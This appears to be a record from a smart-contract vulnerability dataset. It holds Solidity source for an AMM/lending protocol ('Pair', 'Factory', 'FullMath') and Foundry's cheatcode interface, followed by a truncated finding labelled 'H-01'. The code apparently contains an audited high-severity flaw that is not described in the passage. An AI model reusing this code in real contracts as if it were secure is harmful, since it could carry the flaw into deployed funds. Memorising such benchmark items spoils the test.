[
    {
        "Code": "// SPDX-License-Identifier: GPL-3.0-only\npragma solidity ^0.8.4;\n\nimport { ImmutableState } from \"./ImmutableState.sol\";\nimport { ReentrancyGuard } from \"./ReentrancyGuard.sol\";\n\nimport { IPair } from \"./interfaces/IPair.sol\";\nimport { IPairMintCallback } from \"./interfaces/callback/IPairMintCallback.sol\";\nimport { ISwapCallback } from \"./interfaces/callback/ISwapCallback.sol\";\n\nimport { Balance } from \"../libraries/Balance.sol\";\nimport { FullMath } from \"../libraries/FullMath.sol\";\nimport { SafeCast } from \"../libraries/SafeCast.sol\";\nimport { SafeTransferLib } from \"../libraries/SafeTransferLib.sol\";\n\nabstract contract Pair is ImmutableState, ReentrancyGuard, IPair {\n  /*//////////////////////////////////////////////////////////////\n                                 EVENTS\n    //////////////////////////////////////////////////////////////*/\n\n  event Mint(uint256 amount0In, uint256 amount1In, uint256 liquidity);\n\n  event Burn(uint256 amount0Out, uint256 amount1Out, uint256 liquidity, address indexed to);\n\n  event Swap(uint256 amount0Out, uint256 amount1Out, uint256 amount0In, uint256 amount1In, address indexed to);\n\n  /*//////////////////////////////////////////////////////////////\n                                 ERRORS\n    //////////////////////////////////////////////////////////////*/\n\n  error InvariantError();\n\n  error InsufficientOutputError();\n\n  /*//////////////////////////////////////////////////////////////\n                                 STORAGE\n    //////////////////////////////////////////////////////////////*/\n\n  /// @inheritdoc IPair\n  uint120 public override reserve0;\n\n  /// @inheritdoc IPair\n  uint120 public override reserve1;\n\n  /// @inheritdoc IPair\n  uint256 public override totalLiquidity;\n\n  /*//////////////////////////////////////////////////////////////\n                              PAIR LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n  /// @inheritdoc IPair\n  function invariant(uint256 amount0, uint256 amount1, uint256 liquidity) public view override returns (bool) {\n    if (liquidity == 0) return (amount0 == 0 && amount1 == 0);\n\n    uint256 scale0 = FullMath.mulDiv(amount0, 1e18, liquidity) * token0Scale;\n    uint256 scale1 = FullMath.mulDiv(amount1, 1e18, liquidity) * token1Scale;\n\n    if (scale1 > 2 * upperBound) revert InvariantError();\n\n    uint256 a = scale0 * 1e18;\n    uint256 b = scale1 * upperBound;\n    uint256 c = (scale1 * scale1) / 4;\n    uint256 d = upperBound * upperBound;\n\n    return a + b >= c + d;\n  }\n\n  /// @dev assumes liquidity is non-zero\n  function mint(uint256 liquidity, bytes calldata data) internal {\n    uint120 _reserve0 = reserve0; // SLOAD\n    uint120 _reserve1 = reserve1; // SLOAD\n    uint256 _totalLiquidity = totalLiquidity; // SLOAD\n\n    uint256 balance0Before = Balance.balance(token0);\n    uint256 balance1Before = Balance.balance(token1);\n    IPairMintCallback(msg.sender).pairMintCallback(liquidity, data);\n    uint256 amount0In = Balance.balance(token0) - balance0Before;\n    uint256 amount1In = Balance.balance(token1) - balance1Before;\n\n    if (!invariant(_reserve0 + amount0In, _reserve1 + amount1In, _totalLiquidity + liquidity)) {\n      revert InvariantError();\n    }\n\n    reserve0 = _reserve0 + SafeCast.toUint120(amount0In); // SSTORE\n    reserve1 = _reserve1 + SafeCast.toUint120(amount1In); // SSTORE\n    totalLiquidity = _totalLiquidity + liquidity; // SSTORE\n\n    emit Mint(amount0In, amount1In, liquidity);\n  }\n\n  /// @dev assumes liquidity is non-zero\n  function burn(address to, uint256 liquidity) internal returns (uint256 amount0, uint256 amount1) {\n    uint120 _reserve0 = reserve0; // SLOAD\n    uint120 _reserve1 = reserve1; // SLOAD\n    uint256 _totalLiquidity = totalLiquidity; // SLOAD\n\n    amount0 = FullMath.mulDiv(_reserve0, liquidity, _totalLiquidity);\n    amount1 = FullMath.mulDiv(_reserve1, liquidity, _totalLiquidity);\n    if (amount0 == 0 && amount1 == 0) revert InsufficientOutputError();\n\n    if (amount0 > 0) SafeTransferLib.safeTransfer(token0, to, amount0);\n    if (amount1 > 0) SafeTransferLib.safeTransfer(token1, to, amount1);\n\n    // Extra check of the invariant\n    if (!invariant(_reserve0 - amount0, _reserve1 - amount1, _totalLiquidity - liquidity)) revert InvariantError();\n\n    reserve0 = _reserve0 - SafeCast.toUint120(amount0); // SSTORE\n    reserve1 = _reserve1 - SafeCast.toUint120(amount1); // SSTORE\n    totalLiquidity = _totalLiquidity - liquidity; // SSTORE\n\n    emit Burn(amount0, amount1, liquidity, to);\n  }\n\n  /// @inheritdoc IPair\n  function swap(address to, uint256 amount0Out, uint256 amount1Out, bytes calldata data) external override nonReentrant {\n    if (amount0Out == 0 && amount1Out == 0) revert InsufficientOutputError();\n\n    uint120 _reserve0 = reserve0; // SLOAD\n    uint120 _reserve1 = reserve1; // SLOAD\n\n    if (amount0Out > 0) SafeTransferLib.safeTransfer(token0, to, amount0Out);\n    if (amount1Out > 0) SafeTransferLib.safeTransfer(token1, to, amount1Out);\n\n    uint256 balance0Before = Balance.balance(token0);\n    uint256 balance1Before = Balance.balance(token1);\n    ISwapCallback(msg.sender).swapCallback(amount0Out, amount1Out, data);\n    uint256 amount0In = Balance.balance(token0) - balance0Before;\n    uint256 amount1In = Balance.balance(token1) - balance1Before;\n\n    if (!invariant(_reserve0 + amount0In - amount0Out, _reserve1 + amount1In - amount1Out, totalLiquidity)) {\n      revert InvariantError();\n    }\n\n    reserve0 = _reserve0 + SafeCast.toUint120(amount0In) - SafeCast.toUint120(amount0Out); // SSTORE\n    reserve1 = _reserve1 + SafeCast.toUint120(amount1In) - SafeCast.toUint120(amount1Out); // SSTORE\n\n    emit Swap(amount0Out, amount1Out, amount0In, amount1In, to);\n  }\n}\n\n\n// SPDX-License-Identifier: GPL-3.0-only\npragma solidity ^0.8.4;\n\nimport { Lendgine } from \"./Lendgine.sol\";\n\nimport { IFactory } from \"./interfaces/IFactory.sol\";\n\ncontract Factory is IFactory {\n  /*//////////////////////////////////////////////////////////////\n                                 EVENTS\n    //////////////////////////////////////////////////////////////*/\n\n  event LendgineCreated(\n    address indexed token0,\n    address indexed token1,\n    uint256 token0Exp,\n    uint256 token1Exp,\n    uint256 indexed upperBound,\n    address lendgine\n  );\n\n  /*//////////////////////////////////////////////////////////////\n                                 ERRORS\n    //////////////////////////////////////////////////////////////*/\n\n  error SameTokenError();\n\n  error ZeroAddressError();\n\n  error DeployedError();\n\n  error ScaleError();\n\n  /*//////////////////////////////////////////////////////////////\n                            FACTORY STORAGE\n    //////////////////////////////////////////////////////////////*/\n\n  /// @inheritdoc IFactory\n  mapping(address => mapping(address => mapping(uint256 => mapping(uint256 => mapping(uint256 => address)))))\n    public\n    override getLendgine;\n\n  /*//////////////////////////////////////////////////////////////\n                        TEMPORARY DEPLOY STORAGE\n    //////////////////////////////////////////////////////////////*/\n\n  struct Parameters {\n    address token0;\n    address token1;\n    uint128 token0Exp;\n    uint128 token1Exp;\n    uint256 upperBound;\n  }\n\n  /// @inheritdoc IFactory\n  Parameters public override parameters;\n\n  /*//////////////////////////////////////////////////////////////\n                              FACTORY LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n  /// @inheritdoc IFactory\n  function createLendgine(\n    address token0,\n    address token1,\n    uint8 token0Exp,\n    uint8 token1Exp,\n    uint256 upperBound\n  )\n    external\n    override\n    returns (address lendgine)\n  {\n    if (token0 == token1) revert SameTokenError();\n    if (token0 == address(0) || token1 == address(0)) revert ZeroAddressError();\n    if (getLendgine[token0][token1][token0Exp][token1Exp][upperBound] != address(0)) revert DeployedError();\n    if (token0Exp > 18 || token0Exp < 6 || token1Exp > 18 || token1Exp < 6) revert ScaleError();\n\n    parameters =\n      Parameters({token0: token0, token1: token1, token0Exp: token0Exp, token1Exp: token1Exp, upperBound: upperBound});\n\n    lendgine = address(new Lendgine{ salt: keccak256(abi.encode(token0, token1, token0Exp, token1Exp, upperBound)) }());\n\n    delete parameters;\n\n    getLendgine[token0][token1][token0Exp][token1Exp][upperBound] = lendgine;\n    emit LendgineCreated(token0, token1, token0Exp, token1Exp, upperBound, lendgine);\n  }\n}\n\n\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\n// solhint-disable max-line-length\n\n/// @title Contains 512-bit math functions\n/// @notice Facilitates multiplication and division that can have overflow of an intermediate value without any loss of\n/// precision\n/// @author Muffin (https://github.com/muffinfi/muffin/blob/master/contracts/libraries/math/FullMath.sol)\n/// @dev Handles \"phantom overflow\" i.e., allows multiplication and division where an intermediate value overflows 256\n/// bits\nlibrary FullMath {\n  /// @notice Calculates floor(a\u00d7b\u00f7denominator) with full precision. Throws if result overflows a uint256 or\n  /// denominator == 0\n  /// @param a The multiplicand\n  /// @param b The multiplier\n  /// @param denominator The divisor\n  /// @return result The 256-bit result\n  /// @dev Credit to Remco Bloemen under MIT license https://xn--2-umb.com/21/muldiv\n  function mulDiv(uint256 a, uint256 b, uint256 denominator) internal pure returns (uint256 result) {\n    unchecked {\n      // 512-bit multiply [prod1 prod0] = a * b\n      // Compute the product mod 2**256 and mod 2**256 - 1\n      // then use the Chinese Remainder Theorem to reconstruct\n      // the 512 bit result. The result is stored in two 256\n      // variables such that product = prod1 * 2**256 + prod0\n      uint256 prod0; // Least significant 256 bits of the product\n      uint256 prod1; // Most significant 256 bits of the product\n      assembly {\n        let mm := mulmod(a, b, not(0))\n        prod0 := mul(a, b)\n        prod1 := sub(sub(mm, prod0), lt(mm, prod0))\n      }\n\n      // Handle non-overflow cases, 256 by 256 division\n      if (prod1 == 0) {\n        require(denominator > 0);\n        assembly {\n          result := div(prod0, denominator)\n        }\n        return result;\n      }\n\n      // Make sure the result is less than 2**256.\n      // Also prevents denominator == 0\n      require(denominator > prod1);\n\n      ///////////////////////////////////////////////\n      // 512 by 256 division.\n      ///////////////////////////////////////////////\n\n      // Make division exact by subtracting the remainder from [prod1 prod0]\n      // Compute remainder using mulmod\n      uint256 remainder;\n      assembly {\n        remainder := mulmod(a, b, denominator)\n      }\n      // Subtract 256 bit number from 512 bit number\n      assembly {\n        prod1 := sub(prod1, gt(remainder, prod0))\n        prod0 := sub(prod0, remainder)\n      }\n\n      // Factor powers of two out of denominator\n      // Compute largest power of two divisor of denominator.\n      // Always >= 1.\n\n      // [*] The next line is edited to be compatible with solidity 0.8\n      // ref: https://ethereum.stackexchange.com/a/96646\n      // original: uint256 twos = -denominator & denominator;\n      uint256 twos = denominator & (~denominator + 1);\n\n      // Divide denominator by power of two\n      assembly {\n        denominator := div(denominator, twos)\n      }\n\n      // Divide [prod1 prod0] by the factors of two\n      assembly {\n        prod0 := div(prod0, twos)\n      }\n      // Shift in bits from prod1 into prod0. For this we need\n      // to flip `twos` such that it is 2**256 / twos.\n      // If twos is zero, then it becomes one\n      assembly {\n        twos := add(div(sub(0, twos), twos), 1)\n      }\n      prod0 |= prod1 * twos;\n\n      // Invert denominator mod 2**256\n      // Now that denominator is an odd number, it has an inverse\n      // modulo 2**256 such that denominator * inv = 1 mod 2**256.\n      // Compute the inverse by starting with a seed that is correct\n      // correct for four bits. That is, denominator * inv = 1 mod 2**4\n      uint256 inv = (3 * denominator) ^ 2;\n      // Now use Newton-Raphson iteration to improve the precision.\n      // Thanks to Hensel's lifting lemma, this also works in modular\n      // arithmetic, doubling the correct bits in each step.\n      inv *= 2 - denominator * inv; // inverse mod 2**8\n      inv *= 2 - denominator * inv; // inverse mod 2**16\n      inv *= 2 - denominator * inv; // inverse mod 2**32\n      inv *= 2 - denominator * inv; // inverse mod 2**64\n      inv *= 2 - denominator * inv; // inverse mod 2**128\n      inv *= 2 - denominator * inv; // inverse mod 2**256\n\n      // Because the division is now exact we can divide by multiplying\n      // with the modular inverse of denominator. This will give us the\n      // correct result modulo 2**256. Since the precoditions guarantee\n      // that the outcome is less than 2**256, this is the final result.\n      // We don't need to compute the high bits of the result and prod1\n      // is no longer required.\n      result = prod0 * inv;\n      return result;\n    }\n  }\n\n  /// @notice Calculates ceil(a\u00d7b\u00f7denominator) with full precision. Throws if result overflows a uint256 or\n  /// denominator == 0\n  /// @param a The multiplicand\n  /// @param b The multiplier\n  /// @param denominator The divisor\n  /// @return result The 256-bit result\n  function mulDivRoundingUp(uint256 a, uint256 b, uint256 denominator) internal pure returns (uint256 result) {\n    result = mulDiv(a, b, denominator);\n    if (mulmod(a, b, denominator) > 0) {\n      result++;\n    }\n  }\n}\n\n\n// SPDX-License-Identifier: MIT\npragma solidity >=0.6.2 <0.9.0;\n\npragma experimental ABIEncoderV2;\n\n// Cheatcodes are marked as view/pure/none using the following rules:\n// 0. A call's observable behaviour includes its return value, logs, reverts and state writes,\n// 1. If you can influence a later call's observable behaviour, you're neither `view` nor `pure (you are modifying some state be it the EVM, interpreter, filesystem, etc),\n// 2. Otherwise if you can be influenced by an earlier call, or if reading some state, you're `view`,\n// 3. Otherwise you're `pure`.\n\ninterface VmSafe {\n    struct Log {\n        bytes32[] topics;\n        bytes data;\n        address emitter;\n    }\n\n    struct Rpc {\n        string key;\n        string url;\n    }\n\n    struct FsMetadata {\n        bool isDir;\n        bool isSymlink;\n        uint256 length;\n        bool readOnly;\n        uint256 modified;\n        uint256 accessed;\n        uint256 created;\n    }\n\n    // Loads a storage slot from an address\n    function load(address target, bytes32 slot) external view returns (bytes32 data);\n    // Signs data\n    function sign(uint256 privateKey, bytes32 digest) external pure returns (uint8 v, bytes32 r, bytes32 s);\n    // Gets the address for a given private key\n    function addr(uint256 privateKey) external pure returns (address keyAddr);\n    // Gets the nonce of an account\n    function getNonce(address account) external view returns (uint64 nonce);\n    // Performs a foreign function call via the terminal\n    function ffi(string[] calldata commandInput) external returns (bytes memory result);\n    // Sets environment variables\n    function setEnv(string calldata name, string calldata value) external;\n    // Reads environment variables, (name) => (value)\n    function envBool(string calldata name) external view returns (bool value);\n    function envUint(string calldata name) external view returns (uint256 value);\n    function envInt(string calldata name) external view returns (int256 value);\n    function envAddress(string calldata name) external view returns (address value);\n    function envBytes32(string calldata name) external view returns (bytes32 value);\n    function envString(string calldata name) external view returns (string memory value);\n    function envBytes(string calldata name) external view returns (bytes memory value);\n    // Reads environment variables as arrays\n    function envBool(string calldata name, string calldata delim) external view returns (bool[] memory value);\n    function envUint(string calldata name, string calldata delim) external view returns (uint256[] memory value);\n    function envInt(string calldata name, string calldata delim) external view returns (int256[] memory value);\n    function envAddress(string calldata name, string calldata delim) external view returns (address[] memory value);\n    function envBytes32(string calldata name, string calldata delim) external view returns (bytes32[] memory value);\n    function envString(string calldata name, string calldata delim) external view returns (string[] memory value);\n    function envBytes(string calldata name, string calldata delim) external view returns (bytes[] memory value);\n    // Read environment variables with default value\n    function envOr(string calldata name, bool defaultValue) external returns (bool value);\n    function envOr(string calldata name, uint256 defaultValue) external returns (uint256 value);\n    function envOr(string calldata name, int256 defaultValue) external returns (int256 value);\n    function envOr(string calldata name, address defaultValue) external returns (address value);\n    function envOr(string calldata name, bytes32 defaultValue) external returns (bytes32 value);\n    function envOr(string calldata name, string calldata defaultValue) external returns (string memory value);\n    function envOr(string calldata name, bytes calldata defaultValue) external returns (bytes memory value);\n    // Read environment variables as arrays with default value\n    function envOr(string calldata name, string calldata delim, bool[] calldata defaultValue)\n        external\n        returns (bool[] memory value);\n    function envOr(string calldata name, string calldata delim, uint256[] calldata defaultValue)\n        external\n        returns (uint256[] memory value);\n    function envOr(string calldata name, string calldata delim, int256[] calldata defaultValue)\n        external\n        returns (int256[] memory value);\n    function envOr(string calldata name, string calldata delim, address[] calldata defaultValue)\n        external\n        returns (address[] memory value);\n    function envOr(string calldata name, string calldata delim, bytes32[] calldata defaultValue)\n        external\n        returns (bytes32[] memory value);\n    function envOr(string calldata name, string calldata delim, string[] calldata defaultValue)\n        external\n        returns (string[] memory value);\n    function envOr(string calldata name, string calldata delim, bytes[] calldata defaultValue)\n        external\n        returns (bytes[] memory value);\n    // Records all storage reads and writes\n    function record() external;\n    // Gets all accessed reads and write slot from a recording session, for a given address\n    function accesses(address target) external returns (bytes32[] memory readSlots, bytes32[] memory writeSlots);\n    // Gets the _creation_ bytecode from an artifact file. Takes in the relative path to the json file\n    function getCode(string calldata artifactPath) external view returns (bytes memory creationBytecode);\n    // Gets the _deployed_ bytecode from an artifact file. Takes in the relative path to the json file\n    function getDeployedCode(string calldata artifactPath) external view returns (bytes memory runtimeBytecode);\n    // Labels an address in call traces\n    function label(address account, string calldata newLabel) external;\n    // Using the address that calls the test contract, has the next call (at this call depth only) create a transaction that can later be signed and sent onchain\n    function broadcast() external;\n    // Has the next call (at this call depth only) create a transaction with the address provided as the sender that can later be signed and sent onchain\n    function broadcast(address signer) external;\n    // Has the next call (at this call depth only) create a transaction with the private key provided as the sender that can later be signed and sent onchain\n    function broadcast(uint256 privateKey) external;\n    // Using the address that calls the test contract, has all subsequent calls (at this call depth only) create transactions that can later be signed and sent onchain\n    function startBroadcast() external;\n    // Has all subsequent calls (at this call depth only) create transactions with the address provided that can later be signed and sent onchain\n    function startBroadcast(address signer) external;\n    // Has all subsequent calls (at this call depth only) create transactions with the private key provided that can later be signed and sent onchain\n    function startBroadcast(uint256 privateKey) external;\n    // Stops collecting onchain transactions\n    function stopBroadcast() external;\n    // Reads the entire content of file to string\n    function readFile(string calldata path) external view returns (string memory data);\n    // Reads the entire content of file as binary. Path is relative to the project root.\n    function readFileBinary(string calldata path) external view returns (bytes memory data);\n    // Get the path of the current project root\n    function projectRoot() external view returns (string memory path);\n    // Get the metadata for a file/directory\n    function fsMetadata(string calldata fileOrDir) external returns (FsMetadata memory metadata);\n    // Reads next line of file to string\n    function readLine(string calldata path) external view returns (string memory line);\n    // Writes data to file, creating a file if it does not exist, and entirely replacing its contents if it does.\n    function writeFile(string calldata path, string calldata data) external;\n    // Writes binary data to a file, creating a file if it does not exist, and entirely replacing its contents if it does.\n    // Path is relative to the project root.\n    function writeFileBinary(string calldata path, bytes calldata data) external;\n    // Writes line to file, creating a file if it does not exist.\n    function writeLine(string calldata path, string calldata data) external;\n    // Closes file for reading, resetting the offset and allowing to read it from beginning with readLine.\n    function closeFile(string calldata path) external;\n    // Removes file. This cheatcode will revert in the following situations, but is not limited to just these cases:\n    // - Path points to a directory.\n    // - The file doesn't exist.\n    // - The user lacks permissions to remove the file.\n    function removeFile(string calldata path) external;\n    // Convert values to a string\n    function toString(address value) external pure returns (string memory stringifiedValue);\n    function toString(bytes calldata value) external pure returns (string memory stringifiedValue);\n    function toString(bytes32 value) external pure returns (string memory stringifiedValue);\n    function toString(bool value) external pure returns (string memory stringifiedValue);\n    function toString(uint256 value) external pure returns (string memory stringifiedValue);\n    function toString(int256 value) external pure returns (string memory stringifiedValue);\n    // Convert values from a string\n    function parseBytes(string calldata stringifiedValue) external pure returns (bytes memory parsedValue);\n    function parseAddress(string calldata stringifiedValue) external pure returns (address parsedValue);\n    function parseUint(string calldata stringifiedValue) external pure returns (uint256 parsedValue);\n    function parseInt(string calldata stringifiedValue) external pure returns (int256 parsedValue);\n    function parseBytes32(string calldata stringifiedValue) external pure returns (bytes32 parsedValue);\n    function parseBool(string calldata stringifiedValue) external pure returns (bool parsedValue);\n    // Record all the transaction logs\n    function recordLogs() external;\n    // Gets all the recorded logs\n    function getRecordedLogs() external returns (Log[] memory logs);\n    // Derive a private key from a provided mnenomic string (or mnenomic file path) at the derivation path m/44'/60'/0'/0/{index}\n    function deriveKey(string calldata mnemonic, uint32 index) external pure returns (uint256 privateKey);\n    // Derive a private key from a provided mnenomic string (or mnenomic file path) at {derivationPath}{index}\n    function deriveKey(string calldata mnemonic, string calldata derivationPath, uint32 index)\n        external\n        pure\n        returns (uint256 privateKey);\n    // Adds a private key to the local forge wallet and returns the address\n    function rememberKey(uint256 privateKey) external returns (address keyAddr);\n    //\n    // parseJson\n    //\n    // ----\n    // In case the returned value is a JSON object, it's encoded as a ABI-encoded tuple. As JSON objects\n    // don't have the notion of ordered, but tuples do, they JSON object is encoded with it's fields ordered in\n    // ALPHABETICAL order. That means that in order to successfully decode the tuple, we need to define a tuple that\n    // encodes the fields in the same order, which is alphabetical. In the case of Solidity structs, they are encoded\n    // as tuples, with the attributes in the order in which they are defined.\n    // For example: json = { 'a': 1, 'b': 0xa4tb......3xs}\n    // a: uint256\n    // b: address\n    // To decode that json, we need to define a struct or a tuple as follows:\n    // struct json = { uint256 a; address b; }\n    // If we defined a json struct with the opposite order, meaning placing the address b first, it would try to\n    // decode the tuple in that order, and thus fail.\n    // ----\n    // Given a string of JSON, return it as ABI-encoded\n    function parseJson(string calldata json, string calldata key) external pure returns (bytes memory abiEncodedData);\n    function parseJson(string calldata json) external pure returns (bytes memory abiEncodedData);\n\n    // Serialize a key and value to a JSON object stored in-memory that can be later written to a file\n    // It returns the stringified version of the specific JSON file up to that moment.\n    function serializeBool(string calldata objectKey, string calldata valueKey, bool value)\n        external\n        returns (string memory json);\n    function serializeUint(string calldata objectKey, string calldata valueKey, uint256 value)\n        external\n        returns (string memory json);\n    function serializeInt(string calldata objectKey, string calldata valueKey, int256 value)\n        external\n        returns (string memory json);\n    function serializeAddress(string calldata objectKey, string calldata valueKey, address value)\n        external\n        returns (string memory json);\n    function serializeBytes32(string calldata objectKey, string calldata valueKey, bytes32 value)\n        external\n        returns (string memory json);\n    function serializeString(string calldata objectKey, string calldata valueKey, string calldata value)\n        external\n        returns (string memory json);\n    function serializeBytes(string calldata objectKey, string calldata valueKey, bytes calldata value)\n        external\n        returns (string memory json);\n\n    function serializeBool(string calldata objectKey, string calldata valueKey, bool[] calldata values)\n        external\n        returns (string memory json);\n    function serializeUint(string calldata objectKey, string calldata valueKey, uint256[] calldata values)\n        external\n        returns (string memory json);\n    function serializeInt(string calldata objectKey, string calldata valueKey, int256[] calldata values)\n        external\n        returns (string memory json);\n    function serializeAddress(string calldata objectKey, string calldata valueKey, address[] calldata values)\n        external\n        returns (string memory json);\n    function serializeBytes32(string calldata objectKey, string calldata valueKey, bytes32[] calldata values)\n        external\n        returns (string memory json);\n    function serializeString(string calldata objectKey, string calldata valueKey, string[] calldata values)\n        external\n        returns (string memory json);\n    function serializeBytes(string calldata objectKey, string calldata valueKey, bytes[] calldata values)\n        external\n        returns (string memory json);\n\n    //\n    // writeJson\n    //\n    // ----\n    // Write a serialized JSON object to a file. If the file exists, it will be overwritten.\n    // Let's assume we want to write the following JSON to a file:\n    //\n    // { \"boolean\": true, \"number\": 342, \"object\": { \"title\": \"finally json serialization\" } }\n    //\n    // ```\n    //  string memory json1 = \"some key\";\n    //  vm.serializeBool(json1, \"boolean\", true);\n    //  vm.serializeBool(json1, \"number\", uint256(342));\n    //  json2 = \"some other key\";\n    //  string memory output = vm.serializeString(json2, \"title\", \"finally json serialization\");\n    //  string memory finalJson = vm.serialize(json1, \"object\", output);\n    //  vm.writeJson(finalJson, \"./output/example.json\");\n    // ```\n    // The critical insight is that every invocation of serialization will return the stringified version of the JSON\n    // up to that point. That means we can construct arbitrary JSON objects and then use the return stringified version\n    // to serialize them as values to another JSON object.\n    //\n    // json1 and json2 are simply keys used by the backend to keep track of the objects. So vm.serializeJson(json1,..)\n    // will find the object in-memory that is keyed by \"some key\".\n    function writeJson(string calldata json, string calldata path) external;\n    // Write a serialized JSON object to an **existing** JSON file, replacing a value with key = <value_key>\n    // This is useful to replace a specific value of a JSON file, without having to parse the entire thing\n    function writeJson(string calldata json, string calldata path, string calldata valueKey) external;\n    // Returns the RPC url for the given alias\n    function rpcUrl(string calldata rpcAlias) external view returns (string memory json);\n    // Returns all rpc urls and their aliases `[alias, url][]`\n    function rpcUrls() external view returns (string[2][] memory urls);\n    // Returns all rpc urls and their aliases as structs.\n    function rpcUrlStructs() external view returns (Rpc[] memory urls);\n    // If the condition is false, discard this run's fuzz inputs and generate new ones.\n    function assume(bool condition) external pure;\n    // Pauses gas metering (i.e. gas usage is not counted). Noop if already paused.\n    function pauseGasMetering() external;\n    // Resumes gas metering (i.e. gas usage is counted again). Noop if already on.\n    function resumeGasMetering() external;\n}\n\ninterface Vm is VmSafe {\n    // Sets block.timestamp\n    function warp(uint256 newTimestamp) external;\n    // Sets block.height\n    function roll(uint256 newHeight) external;\n    // Sets block.basefee\n    function fee(uint256 newBasefee) external;\n    // Sets block.difficulty\n    function difficulty(uint256 newDifficulty) external;\n    // Sets block.chainid\n    function chainId(uint256 newChainId) external;\n    // Stores a value to an address' storage slot.\n    function store(address target, bytes32 slot, bytes32 value) external;\n    // Sets the nonce of an account; must be higher than the current nonce of the account\n    function setNonce(address account, uint64 newNonce) external;\n    // Sets the *next* call's msg.sender to be the input address\n    function prank(address msgSender) external;\n    // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called\n    function startPrank(address msgSender) external;\n    // Sets the *next* call's msg.sender to be the input address, and the tx.origin to be the second input\n    function prank(address msgSender, address txOrigin) external;\n    // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called, and the tx.origin to be the second input\n    function startPrank(address msgSender, address txOrigin) external;\n    // Resets subsequent calls' msg.sender to be `address(this)`\n    function stopPrank() external;\n    // Sets an address' balance\n    function deal(address account, uint256 newBalance) external;\n    // Sets an address' code\n    function etch(address target, bytes calldata newRuntimeBytecode) external;\n    // Expects an error on next call\n    function expectRevert(bytes calldata revertData) external;\n    function expectRevert(bytes4 revertData) external;\n    function expectRevert() external;\n    // Prepare an expected log with (bool checkTopic1, bool checkTopic2, bool checkTopic3, bool checkData).\n    // Call this function, then emit an event, then call a function. Internally after the call, we check if\n    // logs were emitted in the expected order with the expected topics and data (as specified by the booleans)\n    function expectEmit(bool checkTopic1, bool checkTopic2, bool checkTopic3, bool checkData) external;\n    function expectEmit(bool checkTopic1, bool checkTopic2, bool checkTopic3, bool checkData, address emitter)\n        external;\n    // Mocks a call to an address, returning specified data.\n    // Calldata can either be strict or a partial match, e.g. if you only\n    // pass a Solidity selector to the expected calldata, then the entire Solidity\n    // function will be mocked.\n    function mockCall(address callee, bytes calldata data, bytes calldata returnData) external;\n    // Mocks a call to an address with a specific msg.value, returning specified data.\n    // Calldata match takes precedence over msg.value in case of ambiguity.\n    function mockCall(address callee, uint256 msgValue, bytes calldata data, bytes calldata returnData) external;\n    // Clears all mocked calls\n    function clearMockedCalls() external;\n    // Expects a call to an address with the specified calldata.\n    // Calldata can either be a strict or a partial match\n    function expectCall(address callee, bytes calldata data) external;\n    // Expects a call to an address with the specified msg.value and calldata\n    function expectCall(address callee, uint256 msgValue, bytes calldata data) external;\n    // Sets block.coinbase\n    function coinbase(address newCoinbase) external;\n    // Snapshot the current state of the evm.\n    // Returns the id of the snapshot that was created.\n    // To revert a snapshot use `revertTo`\n    function snapshot() external returns (uint256 snapshotId);\n    // Revert the state of the EVM to a previous snapshot\n    // Takes the snapshot id to revert to.\n    // This deletes the snapshot and all snapshots taken after the given snapshot id.\n    function revertTo(uint256 snapshotId) external returns (bool success);\n    // Creates a new fork with the given endpoint and block and returns the identifier of the fork\n    function createFork(string calldata urlOrAlias, uint256 blockNumber) external returns (uint256 forkId);\n    // Creates a new fork with the given endpoint and the _latest_ block and returns the identifier of the fork\n    function createFork(string calldata urlOrAlias) external returns (uint256 forkId);\n    // Creates a new fork with the given endpoint and at the block the given transaction was mined in, replays all transaction mined in the block before the transaction,\n    // and returns the identifier of the fork\n    function createFork(string calldata urlOrAlias, bytes32 txHash) external returns (uint256 forkId);\n    // Creates _and_ also selects a new fork with the given endpoint and block and returns the identifier of the fork\n    function createSelectFork(string calldata urlOrAlias, uint256 blockNumber) external returns (uint256 forkId);\n    // Creates _and_ also selects new fork with the given endpoint and at the block the given transaction was mined in, replays all transaction mined in the block before\n    // the transaction, returns the identifier of the fork\n    function createSelectFork(string calldata urlOrAlias, bytes32 txHash) external returns (uint256 forkId);\n    // Creates _and_ also selects a new fork with the given endpoint and the latest block and returns the identifier of the fork\n    function createSelectFork(string calldata urlOrAlias) external returns (uint256 forkId);\n    // Takes a fork identifier created by `createFork` and sets the corresponding forked state as active.\n    function selectFork(uint256 forkId) external;\n    /// Returns the identifier of the currently active fork. Reverts if no fork is currently active.\n    function activeFork() external view returns (uint256 forkId);\n    // Updates the currently active fork to given block number\n    // This is similar to `roll` but for the currently active fork\n    function rollFork(uint256 blockNumber) external;\n    // Updates the currently active fork to given transaction\n    // this will `rollFork` with the number of the block the transaction was mined in and replays all transaction mined before it in the block\n    function rollFork(bytes32 txHash) external;\n    // Updates the given fork to given block number\n    function rollFork(uint256 forkId, uint256 blockNumber) external;\n    // Updates the given fork to block number of the given transaction and replays all transaction mined before it in the block\n    function rollFork(uint256 forkId, bytes32 txHash) external;\n    // Marks that the account(s) should use persistent storage across fork swaps in a multifork setup\n    // Meaning, changes made to the state of this account will be kept when switching forks\n    function makePersistent(address account) external;\n    function makePersistent(address account0, address account1) external;\n    function makePersistent(address account0, address account1, address account2) external;\n    function makePersistent(address[] calldata accounts) external;\n    // Revokes persistent status from the address, previously added via `makePersistent`\n    function revokePersistent(address account) external;\n    function revokePersistent(address[] calldata accounts) external;\n    // Returns true if the account is marked as persistent\n    function isPersistent(address account) external view returns (bool persistent);\n    // In forking mode, explicitly grant the given address cheatcode access\n    function allowCheatcodes(address account) external;\n    // Fetches the given transaction from the active fork and executes it on the current state\n    function transact(bytes32 txHash) external;\n    // Fetches the given transaction from the given fork and executes it on the current state\n    function transact(uint256 forkId, bytes32 txHash) external;\n}\n\n\n",
        "CodeNames": [
            "Pair.sol",
            "Factory.sol",
            "FullMath.sol",
            "Vm.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-01",
                "Location": [
